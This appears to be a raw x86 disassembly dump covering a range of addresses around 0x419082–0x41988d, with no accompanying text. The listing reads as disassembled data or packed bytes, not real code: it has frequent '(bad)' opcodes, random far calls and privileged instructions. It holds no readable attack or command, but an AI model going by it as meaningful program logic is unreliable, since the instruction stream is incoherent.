  419082:	cmp    DWORD PTR [ecx],esi
  419084:	loop   0x419075
  419086:	sar    BYTE PTR [ebp-0x62],0xd9
  41908a:	xor    BYTE PTR cs:[eax],ah
  41908d:	jo     0x4190b7
  41908f:	mov    ecx,0xcb79947f
  419094:	out    0x9a,eax
  419096:	nop
  419097:	inc    ebx
  419098:	adc    dl,ah
  41909a:	pop    es
  41909b:	icebp  
  41909c:	and    eax,0x2fe2b7bf
  4190a1:	fxch   st(4)
  4190a3:	(bad)  
  4190a4:	lahf   
  4190a5:	xchg   esi,eax
  4190a6:	and    ecx,DWORD PTR ds:0x342e084d
  4190ac:	cmp    eax,0x8934b311
  4190b1:	sbb    ebx,DWORD PTR [ecx-0x35]
  4190b4:	inc    edx
  4190b5:	jb     0x4190e5
  4190b7:	or     dh,dh
  4190b9:	xchg   DWORD PTR [ecx-0x2b],ecx
  4190bc:	push   esp
  4190bd:	cmc    
  4190be:	test   ebx,edx
  4190c0:	addr16 gs out dx,al
  4190c3:	int3   
  4190c4:	(bad)  
  4190c5:	in     al,dx
  4190c6:	or     bl,bl
  4190c8:	test   eax,0xceecce92
  4190cd:	mov    eax,0xdacd5f7c
  4190d2:	repz mov ah,bh
  4190d5:	add    BYTE PTR [edx+0x545ee1a6],0x69
  4190dc:	inc    eax
  4190dd:	(bad)  
  4190de:	push   edx
  4190df:	lods   eax,DWORD PTR ds:[esi]
  4190e0:	dec    ebp
  4190e1:	sub    DWORD PTR [ecx-0x50ec8d95],edx
  4190e7:	sbb    BYTE PTR [edx],ch
  4190e9:	add    DWORD PTR [ebx+0x5fbde041],edi
  4190ef:	mov    edi,DWORD PTR [ebp-0x714a5d8a]
  4190f5:	and    ecx,DWORD PTR [ecx+0x2d]
  4190f8:	xor    BYTE PTR [edx+0x1e],bh
  4190fb:	lea    edi,[ecx-0x2a18e5f5]
  419101:	pop    eax
  419102:	push   ds
  419103:	out    0x3a,al
  419105:	lods   al,BYTE PTR ds:[esi]
  419106:	adc    BYTE PTR [edx],ah
  419108:	mov    esp,0x78c053a9
  41910d:	xor    eax,0xc5cf99d6
  419112:	mov    ebp,0x4c84d349
  419117:	dec    ebp
  419118:	je     0x419117
  41911a:	xor    bh,BYTE PTR [ebx+0x6d446e1]
  419120:	xchg   ecx,eax
  419121:	pop    eax
  419122:	mov    ds:0xee6b236d,eax
  419127:	jo     0x419172
  419129:	cs sti 
  41912b:	dec    esi
  41912c:	scas   al,BYTE PTR es:[edi]
  41912d:	test   DWORD PTR [ecx],0xd447c2bc
  419133:	add    edx,edx
  419135:	ss arpl si,di
  419138:	hlt    
  419139:	adc    al,0x2
  41913b:	enter  0x51d7,0x9b
  41913f:	inc    ebp
  419140:	ror    DWORD PTR [ebp-0x7b],1
  419143:	icebp  
  419144:	ss fs aaa 
  419147:	jb     0x4190fc
  419149:	mov    BYTE PTR [esi-0x76],dl
  41914c:	adc    ch,BYTE PTR [esi-0xf]
  41914f:	sub    edi,DWORD PTR [ecx]
  419151:	sbb    al,0x66
  419153:	(bad)  
  419154:	stos   BYTE PTR es:[edi],al
  419155:	dec    esp
  419156:	cmc    
  419157:	rol    BYTE PTR [ebp-0x33],cl
  41915a:	cmp    eax,0x282bf025
  41915f:	or     edi,ebp
  419161:	sbb    BYTE PTR es:[eax-0x2a],bh
  419165:	push   0x23
  419167:	xchg   ecx,eax
  419168:	jp     0x4191cd
  41916a:	cmp    BYTE PTR ds:0xc39d02ca,bh
  419170:	push   ss
  419171:	arpl   WORD PTR ds:[edx],ax
  419174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419175:	test   al,0x11
  419177:	push   ss
  419178:	inc    ebx
  419179:	and    ebx,DWORD PTR [edx]
  41917b:	mov    eax,ds:0x9bca2974
  419180:	mov    edx,0xac8d465e
  419185:	aas    
  419186:	and    DWORD PTR [edi-0x6944ffca],edi
  41918c:	push   cs
  41918d:	test   al,0xfd
  41918f:	popf   
  419190:	cmc    
  419191:	and    DWORD PTR [ebp+0x8],edx
  419194:	in     al,dx
  419195:	bound  edx,QWORD PTR [ebp+0x16a4cf22]
  41919b:	pop    esp
  41919c:	sub    eax,0x161024a4
  4191a1:	ret    
  4191a2:	imul   esp,DWORD PTR [ebx-0x3e],0xf5770d65
  4191a9:	scas   al,BYTE PTR es:[edi]
  4191aa:	enter  0x7cf7,0x7c
  4191ae:	(bad)  [ebx-0x1047fe05]
  4191b4:	cmp    eax,0xd154f27e
  4191b9:	fbld   TBYTE PTR [edx+ebp*8-0x14]
  4191bd:	repnz shr bh,cl
  4191c0:	nop
  4191c1:	jl     0x41914d
  4191c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191c4:	sbb    al,0xa3
  4191c6:	popf   
  4191c7:	(bad)  
  4191c8:	mov    ebx,0x69d244ed
  4191cd:	push   esp
  4191ce:	sbb    BYTE PTR [esi+eiz*8+0x50],0x44
  4191d3:	div    eax
  4191d5:	call   0x3dcd393a
  4191da:	loop   0x4191e1
  4191dc:	call   0x8611dc9f
  4191e1:	push   cs
  4191e2:	sti    
  4191e3:	out    0xa8,al
  4191e5:	shr    BYTE PTR [ecx],cl
  4191e7:	pop    ds
  4191e8:	push   ecx
  4191e9:	in     al,0x4d
  4191eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191ec:	fidivr WORD PTR [esi]
  4191ee:	mov    bl,0xa5
  4191f0:	test   DWORD PTR [eax+eax*1],ecx
  4191f3:	and    eax,0x8d4aafab
  4191f8:	inc    esp
  4191f9:	inc    edx
  4191fa:	(bad)  
  4191fc:	ficom  WORD PTR [ebx+0x53b0fcb4]
  419202:	idiv   DWORD PTR [edi+0x8d35a0b]
  419208:	ja     0x419241
  41920a:	mov    ecx,0x5207e11d
  41920f:	rcr    DWORD PTR [eax],0xca
  419212:	sar    ebp,cl
  419214:	je     0x41928a
  419216:	and    BYTE PTR [ecx+0xf],cl
  419219:	pop    eax
  41921a:	les    ebp,FWORD PTR [edi+0x7765a91b]
  419220:	fdivr  DWORD PTR [ecx]
  419222:	lods   al,BYTE PTR ds:[esi]
  419223:	xchg   edx,eax
  419224:	lea    ebx,[eax]
  419226:	inc    esi
  419227:	arpl   WORD PTR [esi+0x25e37d79],si
  41922d:	lock cli 
  41922f:	sub    eax,0x7074bc11
  419234:	xor    eax,DWORD PTR [edx+0x73531bbd]
  41923a:	cmp    ebx,DWORD PTR [ecx+esi*8]
  41923d:	push   cs
  41923e:	push   esi
  41923f:	lods   eax,DWORD PTR ds:[esi]
  419240:	push   ds
  419241:	shl    BYTE PTR ds:[ebp+0x45],0xed
  419246:	add    bl,cl
  419248:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419249:	out    0xa3,eax
  41924b:	pop    esp
  41924c:	inc    edx
  41924d:	stc    
  41924e:	sub    al,0x30
  419250:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419251:	sbb    al,0xce
  419253:	cmp    al,0x56
  419255:	lds    eax,FWORD PTR [esi+ebp*2+0x63]
  419259:	xchg   edx,eax
  41925a:	pop    ebx
  41925b:	fstp   TBYTE PTR [edi-0x33]
  41925e:	and    cl,BYTE PTR fs:[eax]
  419261:	xchg   esi,eax
  419262:	mov    esi,0xce1ff181
  419267:	js     0x419224
  419269:	iret   
  41926a:	jno    0x4192e2
  41926c:	inc    edx
  41926d:	pop    edi
  41926e:	mov    eax,0xbd7a79e1
  419273:	popa   
  419274:	out    dx,eax
  419275:	jae    0x4192d8
  419277:	add    DWORD PTR [esi-0x7f98fe5],ebp
  41927d:	hlt    
  41927e:	leave  
  41927f:	into   
  419280:	pop    DWORD PTR ds:0xc818aab
  419286:	call   0x6170:0xbecb1e48
  41928d:	jl     0x419221
  41928f:	xor    dh,al
  419291:	add    BYTE PTR [ebp+ebp*2+0x66d8150e],bh
  419298:	xor    DWORD PTR [esi+0x7916f674],ebx
  41929e:	push   esi
  41929f:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4192a1:	repz adc BYTE PTR [edi+0x4d],ch
  4192a5:	push   eax
  4192a6:	out    dx,eax
  4192a7:	mov    ecx,0xe88d038b
  4192ac:	push   cs
  4192ad:	push   esp
  4192ae:	jo     0x41930e
  4192b0:	jg     0x419244
  4192b2:	jmp    0x5b57:0x66c87149
  4192b9:	pop    ds
  4192ba:	and    bh,BYTE PTR [eax-0x3a]
  4192bd:	mov    dh,0xf0
  4192bf:	adc    BYTE PTR [esi-0x28],bl
  4192c2:	cmp    ecx,esi
  4192c4:	loop   0x419284
  4192c6:	cdq    
  4192c7:	add    ecx,DWORD PTR [eax+0x362d3e80]
  4192cd:	add    ah,BYTE PTR [edx-0x515023e2]
  4192d3:	jns    0x4192fb
  4192d5:	add    eax,0x161a320f
  4192da:	or     eax,0xeb6b1700
  4192df:	mov    esi,DWORD PTR [eax]
  4192e1:	xchg   ecx,eax
  4192e2:	shr    esp,1
  4192e4:	mov    ebx,DWORD PTR [ebx]
  4192e6:	jnp    0x4192c4
  4192e8:	aam    0xd7
  4192ea:	dec    eax
  4192eb:	mov    BYTE PTR [ecx+ebp*4+0x1f1c7cf4],bl
  4192f2:	pop    ebp
  4192f3:	sbb    al,0xed
  4192f5:	int    0x36
  4192f7:	int    0x6c
  4192f9:	mov    ?,WORD PTR [edi+esi*8+0x767bfa40]
  419300:	inc    ecx
  419301:	gs ret 0x683c
  419305:	jb     0x41934b
  419307:	aam    0x29
  419309:	repz test BYTE PTR [ecx-0x80],dh
  41930d:	push   edx
  41930e:	int3   
  41930f:	retf   
  419310:	loopne 0x41935e
  419312:	ud2    
  419314:	test   DWORD PTR [ebp+0x5ca3511b],esi
  41931a:	adc    BYTE PTR [ebp-0x5f9a8358],cl
  419320:	sbb    eax,0x2939e849
  419325:	sbb    DWORD PTR [esi+0x25],ebx
  419328:	pop    ds
  419329:	call   FWORD PTR [edi+0x7614391c]
  41932f:	rol    DWORD PTR [edi+0x3f],cl
  419332:	sub    eax,0x4db7da40
  419337:	and    ebp,DWORD PTR [eax-0x69b72b27]
  41933d:	mov    eax,ds:0x8fd89bb3
  419342:	mov    al,0x14
  419344:	mov    eax,DWORD PTR [ecx]
  419346:	cmp    ebx,DWORD PTR [eax+0x7c8b005a]
  41934c:	adc    BYTE PTR [ecx-0x3796f565],ch
  419352:	mov    BYTE PTR [ebx],ah
  419354:	repnz inc eax
  419356:	xchg   ebp,eax
  419357:	fdivr  DWORD PTR [ebx]
  419359:	mov    esp,0xc12da353
  41935e:	hlt    
  41935f:	enter  0xda9f,0x37
  419363:	sub    eax,0x86c215e7
  419368:	inc    edx
  419369:	(bad)  
  41936b:	inc    eax
  41936c:	inc    esp
  41936d:	cmp    BYTE PTR [ecx],al
  41936f:	jp     0x4192fd
  419371:	pop    eax
  419372:	pop    edi
  419373:	enter  0x8012,0x49
  419377:	ret    0x569c
  41937a:	in     eax,dx
  41937b:	adc    eax,0x579b54c5
  419380:	lds    esi,FWORD PTR [esi]
  419382:	stc    
  419383:	stos   BYTE PTR es:[edi],al
  419384:	jns    0x419363
  419386:	int3   
  419387:	xchg   BYTE PTR [ecx],al
  419389:	aas    
  41938a:	mov    ecx,0x270ec0f
  41938f:	das    
  419390:	inc    edi
  419391:	test   edx,0x27578d1c
  419397:	sbb    DWORD PTR [eax-0x70adf94b],esi
  41939d:	mov    esp,0xc46d4099
  4193a2:	and    al,BYTE PTR [edx-0x2b]
  4193a5:	jae    0x4193a4
  4193a7:	aam    0xc4
  4193a9:	jl     0x419374
  4193ab:	rol    esi,cl
  4193ad:	into   
  4193ae:	mov    ds:0xafdbbb41,eax
  4193b3:	xchg   esi,eax
  4193b4:	or     cl,cl
  4193b6:	pop    ds
  4193b7:	mov    ebp,0x423dcf01
  4193bc:	enter  0x4ddb,0x16
  4193c0:	clc    
  4193c1:	jmp    0x419416
  4193c3:	imul   esp,DWORD PTR [ebx+ecx*1],0x5fc6e6bc
  4193ca:	scas   al,BYTE PTR es:[edi]
  4193cb:	and    DWORD PTR [edi-0x51],esp
  4193ce:	rol    BYTE PTR [ecx+0x4be0e8b6],cl
  4193d4:	mov    esi,0xb665599b
  4193d9:	ins    BYTE PTR es:[edi],dx
  4193da:	add    DWORD PTR [edi-0x7],edx
  4193dd:	ja     0x419407
  4193df:	sbb    DWORD PTR [edi],ecx
  4193e1:	mov    edx,0xd1e8642
  4193e6:	xchg   ebp,eax
  4193e7:	pop    ss
  4193e8:	jo     0x41938d
  4193ea:	sub    bl,BYTE PTR [esi]
  4193ec:	int3   
  4193ed:	dec    ecx
  4193ee:	mov    al,0x7b
  4193f0:	addr16 mov cl,0x8f
  4193f3:	xchg   BYTE PTR [esi+eiz*8+0x32],bh
  4193f7:	inc    ebx
  4193f8:	mov    al,ds:0xa852055e
  4193fd:	mov    bh,0xef
  4193ff:	in     al,0xff
  419401:	adc    ah,BYTE PTR [edx]
  419403:	int    0xd4
  419405:	ret    
  419406:	cmp    ah,BYTE PTR [eax-0x57b580ec]
  41940c:	in     eax,dx
  41940d:	push   ss
  41940e:	and    al,0x92
  419410:	mov    edx,0x78db5fbf
  419415:	fild   WORD PTR ds:0xcc189e17
  41941b:	rcl    DWORD PTR [eax],1
  41941d:	mov    edi,ebp
  41941f:	test   DWORD PTR gs:[edi+0x280916f8],edi
  419426:	ret    0xd80c
  419429:	aaa    
  41942a:	mov    ah,0x26
  41942c:	out    0x74,al
  41942e:	cli    
  41942f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419430:	and    bh,BYTE PTR [ebx]
  419432:	gs cmc 
  419434:	(bad)  
  419435:	scas   al,BYTE PTR es:[edi]
  419436:	cmp    eax,0x2d46ec88
  41943b:	sbb    eax,0x2d5a3ed3
  419440:	mov    eax,0xc59ea48b
  419445:	xor    ebp,DWORD PTR [edi-0xb]
  419448:	sbb    eax,esp
  41944a:	fidiv  WORD PTR [esi]
  41944c:	std    
  41944d:	adc    al,ch
  41944f:	jmp    0x4b86:0x93ff
  419455:	adc    eax,0x868c4ed8
  41945a:	dec    eax
  41945b:	adc    esp,0x7e515cb8
  419461:	xchg   esi,eax
  419462:	add    eax,0xbb071e72
  419467:	push   esp
  419468:	sub    eax,DWORD PTR [esi+0x0]
  41946b:	fisttp WORD PTR [edx-0x71]
  41946e:	mov    edi,0x51377699
  419473:	cwde   
  419474:	xchg   ebx,eax
  419475:	outs   dx,DWORD PTR ds:[esi]
  419476:	add    DWORD PTR [ebp-0x1f25049b],ebp
  41947c:	and    dh,ah
  41947e:	out    dx,al
  41947f:	jno    0x419485
  419481:	mov    dl,0xf7
  419483:	ret    0x69ad
  419486:	mov    ecx,DWORD PTR [edi-0x2d2d87f7]
  41948c:	ret    
  41948d:	aaa    
  41948e:	fdivr  QWORD PTR [esi]
  419490:	dec    esi
  419491:	mov    dh,BYTE PTR [edx+eiz*1+0xeafe70d]
  419498:	int3   
  419499:	push   edi
  41949a:	outs   dx,BYTE PTR ds:[esi]
  41949b:	adc    al,0xa3
  41949d:	lods   eax,DWORD PTR ds:[esi]
  41949e:	sub    edi,DWORD PTR [edx+0x586f8e7a]
  4194a4:	add    al,bh
  4194a6:	outs   dx,BYTE PTR ds:[esi]
  4194a7:	xor    dl,BYTE PTR [edx]
  4194a9:	ss dec esi
  4194ab:	add    esi,DWORD PTR [eax+0x39990c96]
  4194b1:	jmp    DWORD PTR [edi+0x1bb2c698]
  4194b7:	inc    ecx
  4194b8:	add    edx,DWORD PTR [ebx-0x3070f495]
  4194be:	shr    BYTE PTR gs:[ecx+edx*2-0x5a],1
  4194c3:	pop    ss
  4194c4:	add    edi,DWORD PTR [ebp-0xbd265b6]
  4194ca:	ds add eax,0xf5c0ee2e
  4194d0:	add    al,0x26
  4194d2:	push   es
  4194d3:	stc    
  4194d4:	jnp    0x4194a3
  4194d6:	std    
  4194d7:	cmp    BYTE PTR [ecx+0x19fca61d],ch
  4194dd:	cmp    DWORD PTR [esi],eax
  4194df:	or     BYTE PTR fs:[ebp-0x30],ah
  4194e3:	adc    edi,0x9
  4194e6:	jae    0x4194f8
  4194e8:	sub    eax,0xa09cbed2
  4194ed:	ror    ebp,cl
  4194ef:	pop    esp
  4194f0:	mov    ds:0x62c8ce3f,eax
  4194f5:	jecxz  0x419567
  4194f7:	mov    ds:0x9746fd05,al
  4194fc:	mov    BYTE PTR [edi-0x58],dh
  4194ff:	jg     0x41949d
  419501:	imul   ecx,esp,0xffffffe3
  419504:	inc    ebx
  419505:	mov    BYTE PTR [esi+0x2b],bh
  419508:	push   ebx
  419509:	adc    DWORD PTR [edx+eax*1-0x43],0x48e4eb00
  419511:	daa    
  419512:	and    DWORD PTR [eax+0x4fb7ab0],ebx
  419518:	das    
  419519:	mov    al,ds:0x6a31bff5
  41951e:	in     eax,0xce
  419520:	popa   
  419521:	sbb    bl,bh
  419523:	popa   
  419524:	jge    0x4194bf
  419526:	retf   
  419527:	ins    DWORD PTR es:[edi],dx
  419528:	xor    DWORD PTR [ebx],esp
  41952a:	loopne 0x4194b9
  41952c:	lock call 0x5750:0x803b58df
  419534:	fwait
  419535:	inc    edx
  419536:	jle    0x4195b2
  419538:	(bad)  [esi-0x74]
  41953b:	dec    edx
  41953c:	or     eax,0x6b4b248f
  419541:	mov    esi,0x1baab7d2
  419546:	mov    ?,esi
  419548:	lds    edi,FWORD PTR [ecx-0x3]
  41954b:	(bad)  
  41954c:	and    al,0xa5
  41954e:	iret   
  41954f:	jecxz  0x419518
  419551:	and    al,0x60
  419553:	outs   dx,BYTE PTR ds:[esi]
  419554:	retf   0x94dd
  419557:	(bad)  
  419558:	out    0xd0,eax
  41955a:	jb     0x419588
  41955c:	clc    
  41955d:	paddsb mm6,QWORD PTR [ebx-0x51]
  419561:	repnz add dl,bh
  419564:	push   esi
  419565:	aas    
  419566:	js     0x4195c3
  419568:	inc    esp
  419569:	add    DWORD PTR [edi],eax
  41956b:	loopne 0x4195d7
  41956d:	sub    ecx,0x32
  419570:	inc    ebx
  419571:	dec    esp
  419572:	cwde   
  419573:	jae    0x4195d7
  419575:	arpl   WORD PTR [esi],sp
  419577:	dec    eax
  419578:	dec    ecx
  419579:	pop    ss
  41957a:	mov    eax,0x18dda4cd
  41957f:	push   eax
  419580:	and    bl,BYTE PTR [ebp+0x6f]
  419583:	inc    ebp
  419584:	ret    
  419585:	ret    
  419586:	cmc    
  419587:	adc    al,0xd4
  419589:	and    DWORD PTR [ebx-0x4d],0xc5cfb1e
  419590:	and    al,0x17
  419592:	(bad)  
  419593:	ins    DWORD PTR es:[edi],dx
  419594:	xor    cl,0x58
  419597:	cmp    al,0x65
  419599:	test   DWORD PTR [ecx],ebp
  41959b:	add    BYTE PTR [esi-0x43bae124],dh
  4195a1:	adc    ecx,DWORD PTR [ecx+0x7f699960]
  4195a7:	and    al,0x5a
  4195a9:	xor    al,0xb4
  4195ab:	out    0x77,eax
  4195ad:	in     al,0xc0
  4195af:	jecxz  0x41953c
  4195b1:	sbb    al,0x39
  4195b3:	jb     0x41962c
  4195b5:	push   edx
  4195b6:	repz in al,0x7
  4195b9:	and    esp,edx
  4195bb:	dec    esi
  4195bc:	scas   eax,DWORD PTR es:[edi]
  4195bd:	mov    bh,0x63
  4195bf:	cli    
  4195c0:	xchg   edx,eax
  4195c1:	xchg   ecx,eax
  4195c2:	addr16 jmp 0x86cd5c38
  4195c8:	(bad)  
  4195c9:	pop    ebp
  4195ca:	push   cs
  4195cb:	retf   
  4195cc:	gs mov ebx,0xe44d6ef2
  4195d2:	fsubr  DWORD PTR [ebx-0x76701504]
  4195d8:	xchg   edi,eax
  4195d9:	ret    
  4195da:	mov    dl,0x18
  4195dc:	jp     0x419599
  4195de:	retf   
  4195df:	ficom  WORD PTR [edx+ebx*1+0x6a48e264]
  4195e6:	sub    al,0xeb
  4195e8:	push   esp
  4195e9:	mov    ds:0x8eb7f80d,eax
  4195ee:	xchg   ebp,eax
  4195ef:	stos   BYTE PTR es:[edi],al
  4195f0:	add    eax,DWORD PTR [edx+0x976f835]
  4195f6:	dec    esp
  4195f7:	mov    bl,0x3a
  4195f9:	adc    ch,ch
  4195fb:	dec    edi
  4195fc:	pusha  
  4195fd:	inc    ebx
  4195fe:	loope  0x41964c
  419600:	mov    gs,WORD PTR [ebx+0x1d]
  419603:	mov    DWORD PTR [edx+0x18],ebp
  419606:	fiadd  DWORD PTR [esi+0x41]
  419609:	jge    0x419684
  41960b:	fdiv   st,st(4)
  41960d:	dec    eax
  41960e:	mov    al,ds:0xc08bacc0
  419613:	(bad)  
  419615:	mov    cl,0x67
  419617:	sub    DWORD PTR [esi-0x53],esp
  41961a:	push   edi
  41961b:	fist   DWORD PTR [ebp-0x60]
  41961e:	adc    eax,0x34e4195
  419623:	push   ebx
  419624:	pop    esp
  419625:	shl    eax,0x42
  419628:	adc    bl,cl
  41962a:	sbb    edx,DWORD PTR [ecx]
  41962c:	push   es
  41962d:	fcom   DWORD PTR [eax+0x3fdd95cb]
  419633:	out    dx,al
  419634:	add    BYTE PTR [edx-0x6154a71],0xf6
  41963b:	jmp    0xfb078de5
  419640:	sbb    eax,0x99bb0f70
  419645:	bound  eax,QWORD PTR [eax]
  419647:	fnstcw WORD PTR [eax+edx*1+0x6e]
  41964b:	jg     0x419630
  41964d:	add    esp,edx
  41964f:	mov    bl,dl
  419651:	or     DWORD PTR [ebx+0x34],0x588ae583
  419658:	fist   DWORD PTR [ebx-0x5]
  41965b:	xchg   esp,eax
  41965c:	ja     0x4195ee
  41965e:	dec    eax
  41965f:	icebp  
  419660:	add    al,0xc2
  419662:	out    0xb5,ax
  419665:	ss scas al,BYTE PTR es:[edi]
  419667:	lods   al,BYTE PTR ds:[esi]
  419668:	loope  0x41963a
  41966a:	test   DWORD PTR [eax+0x7b],ebx
  41966d:	fcom   DWORD PTR [esi+0x1ba771d3]
  419673:	mov    DWORD PTR [ebp+ecx*1-0x1f9de0bb],ecx
  41967a:	add    BYTE PTR [ebx],0x7f
  41967d:	imul   DWORD PTR [ebx-0x7f]
  419680:	jge    0x419687
  419682:	clc    
  419683:	mov    al,ds:0x73771646
  419688:	frstor [esi-0x59]
  41968b:	pop    ds
  41968c:	fs cmp ecx,0x23
  419690:	sub    eax,0x7eaf04f2
  419695:	lds    esp,FWORD PTR [edx+0x56]
  419698:	push   cs
  419699:	mov    bh,0xd3
  41969b:	ret    
  41969c:	addr16 inc eax
  41969e:	jnp    0x4196e7
  4196a0:	push   cs
  4196a1:	dec    ecx
  4196a2:	xchg   ecx,eax
  4196a3:	mov    bh,ch
  4196a5:	and    eax,0xafb052a
  4196aa:	jno    0x419654
  4196ac:	push   edi
  4196ad:	mov    cl,0x59
  4196af:	mov    esi,0xd73a41b6
  4196b4:	inc    esp
  4196b5:	and    BYTE PTR [ebx-0x1ee1557e],0x9c
  4196bc:	rcl    DWORD PTR [esi],0x26
  4196bf:	jl     0x419666
  4196c1:	adc    dl,BYTE PTR [edi+0x60]
  4196c4:	inc    edx
  4196c5:	adc    al,0x18
  4196c7:	stc    
  4196c8:	jbe    0x419693
  4196ca:	sub    BYTE PTR [ebx-0x467c15c3],0x44
  4196d1:	test   BYTE PTR [eax],0xa9
  4196d4:	vmrun  
  4196d7:	and    edx,esi
  4196d9:	lahf   
  4196da:	sbb    ah,ch
  4196dc:	arpl   WORD PTR [edi-0x16dc0253],ax
  4196e2:	xchg   esp,eax
  4196e3:	retf   
  4196e4:	fstp   DWORD PTR [esi+0x307aff2d]
  4196ea:	shr    ecx,1
  4196ec:	xor    eax,0xbc6f90a3
  4196f1:	jbe    0x4196de
  4196f3:	out    dx,eax
  4196f4:	in     al,0xed
  4196f6:	mov    eax,ds:0x2f521c14
  4196fb:	mov    ds:0x5a07b532,eax
  419700:	rcr    DWORD PTR [edi],0x94
  419703:	fsubr  QWORD PTR [edi+0x62]
  419706:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419707:	imul   esi,esp,0xab99444e
  41970d:	loope  0x41970b
  41970f:	aad    0x5f
  419711:	fcom   QWORD PTR [ecx]
  419713:	repz out dx,eax
  419715:	in     al,dx
  419716:	lock jo 0x41973d
  419719:	lahf   
  41971a:	xchg   dh,dh
  41971c:	hlt    
  41971d:	sub    al,BYTE PTR [edi+edx*4]
  419720:	or     ecx,edx
  419722:	(bad)  
  419724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419725:	or     BYTE PTR [ecx-0x6a5fbe3f],dl
  41972b:	push   eax
  41972c:	ror    BYTE PTR [edx+0x4d],0xa8
  419730:	adc    eax,0x447f8605
  419735:	repz jbe 0x419772
  419738:	push   esi
  419739:	sub    eax,0xc27a57ab
  41973e:	mov    ebx,0x87ec269c
  419743:	in     eax,dx
  419744:	or     BYTE PTR [eax+ebx*1-0x22],0xab
  419749:	and    eax,0xe60844d2
  41974e:	dec    ebp
  41974f:	test   eax,0x33b2faf2
  419754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419755:	lock fisttp WORD PTR [edx+0x66]
  419759:	cmp    eax,0x7e8aae09
  41975e:	mov    ebp,0x9f4c592f
  419763:	inc    ebx
  419764:	adc    eax,0x78792192
  419769:	dec    ecx
  41976a:	dec    eax
  41976b:	and    BYTE PTR [edx-0x3a],bh
  41976e:	cli    
  41976f:	add    edx,ecx
  419771:	mov    dl,al
  419773:	out    dx,al
  419774:	scas   al,BYTE PTR es:[edi]
  419775:	sbb    BYTE PTR [ecx],dh
  419777:	sub    edx,DWORD PTR [ebp+edx*2+0x19]
  41977b:	dec    ecx
  41977c:	xchg   ebp,eax
  41977d:	idiv   DWORD PTR [eax+0x4b]
  419780:	pushf  
  419781:	aas    
  419782:	and    eax,0x99560fc5
  419787:	outs   dx,DWORD PTR ds:[esi]
  419788:	mov    edx,0xed660afd
  41978d:	and    bh,BYTE PTR [ecx+esi*4+0x2249ec57]
  419794:	or     al,0x1f
  419796:	sti    
  419797:	sub    esi,DWORD PTR [esi-0x79]
  41979a:	adc    eax,0xeed53a47
  41979f:	imul   ebx,eax,0x50f4151c
  4197a5:	daa    
  4197a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197a7:	mov    WORD PTR [ebx+0x7c85c9c3],fs
  4197ad:	jo     0x4197c7
  4197af:	retf   0xd770
  4197b2:	lock cld 
  4197b4:	sub    DWORD PTR ds:0x15fbb1a5,edi
  4197ba:	ficomp WORD PTR [esi]
  4197bc:	js     0x41983d
  4197be:	push   0xffffffd1
  4197c0:	cmp    al,BYTE PTR [ecx]
  4197c2:	stos   DWORD PTR es:[edi],eax
  4197c3:	dec    ebx
  4197c4:	mov    al,0x63
  4197c6:	and    ah,ch
  4197c8:	jne    0x419833
  4197ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197cb:	xor    edi,DWORD PTR [ebp+0x7d]
  4197ce:	or     cl,BYTE PTR [edx-0x7c]
  4197d1:	mov    WORD PTR [edx-0x48],es
  4197d4:	adc    dl,BYTE PTR [ecx+0x637eeb6]
  4197da:	stos   DWORD PTR es:[edi],eax
  4197db:	bound  edi,QWORD PTR [edx-0x1c]
  4197de:	and    BYTE PTR [eax+0x71],dh
  4197e1:	int    0x88
  4197e3:	pop    es
  4197e4:	dec    ebx
  4197e5:	inc    esi
  4197e6:	mov    edx,0x18c5a597
  4197eb:	arpl   WORD PTR [ecx-0x26ef5f0c],bp
  4197f1:	outs   dx,BYTE PTR ds:[esi]
  4197f2:	shl    esp,0x9a
  4197f5:	push   ds
  4197f6:	fsubr  st,st(6)
  4197f8:	xor    al,0xa8
  4197fa:	test   al,0xa
  4197fc:	out    dx,al
  4197fd:	push   ebx
  4197fe:	xchg   BYTE PTR [ecx+0x0],dl
  419801:	scas   eax,DWORD PTR es:[edi]
  419802:	pop    edi
  419803:	add    DWORD PTR [edx],0xffffffe2
  419806:	mov    eax,ds:0x57380dea
  41980b:	popa   
  41980c:	and    ebx,esp
  41980e:	mov    al,ds:0x3a03caeb
  419813:	test   al,0x45
  419815:	adc    DWORD PTR [esi],0xffffff83
  419818:	xchg   DWORD PTR [ecx+edx*8],ecx
  41981b:	jne    0x4197ec
  41981d:	pop    es
  41981e:	lock jne 0x4197fa
  419821:	jmp    0x4197c8
  419823:	sub    eax,0xc47e1cd1
  419828:	push   es
  419829:	psraw  mm7,QWORD PTR [eax+eax*2+0x738e8d3e]
  419831:	xchg   ebp,eax
  419832:	cwde   
  419833:	retf   
  419834:	nop
  419835:	inc    DWORD PTR [ebp+ecx*2-0x5]
  419839:	cli    
  41983a:	pop    ebx
  41983b:	dec    DWORD PTR [edx+ebx*2-0x24]
  41983f:	mov    dh,0xa0
  419841:	jp     0x419807
  419843:	inc    ebp
  419844:	dec    ecx
  419845:	pop    edx
  419846:	or     DWORD PTR [ebx],esp
  419848:	ret    
  419849:	sub    cx,si
  41984c:	mov    cl,0xf4
  41984e:	pop    es
  41984f:	mov    ds:0xc8289af5,al
  419854:	sub    eax,0xd504486c
  419859:	call   0x79527162
  41985e:	xorps  xmm6,XMMWORD PTR [edi]
  419861:	jmp    0x419876
  419863:	xchg   ebp,eax
  419864:	jnp    0x419872
  419866:	lods   eax,DWORD PTR ds:[esi]
  419867:	mov    esi,0xf1eec209
  41986c:	test   eax,0x89123da3
  419871:	xchg   ecx,eax
  419872:	sub    eax,0x53c4db17
  419877:	jp     0x4198d7
  419879:	pop    ecx
  41987a:	sub    BYTE PTR [edi+0x2e],ah
  41987d:	mov    dl,ah
  41987f:	lahf   
  419880:	push   esi
  419881:	add    DWORD PTR [esi-0x4bdbb566],ebp
  419887:	jle    0x419816
  419889:	mov    dl,0x80
  41988b:	dec    ebp
  41988c:	std    
  41988d:	cmp    BYTE PTR [ebx-0x359c8b41],ch
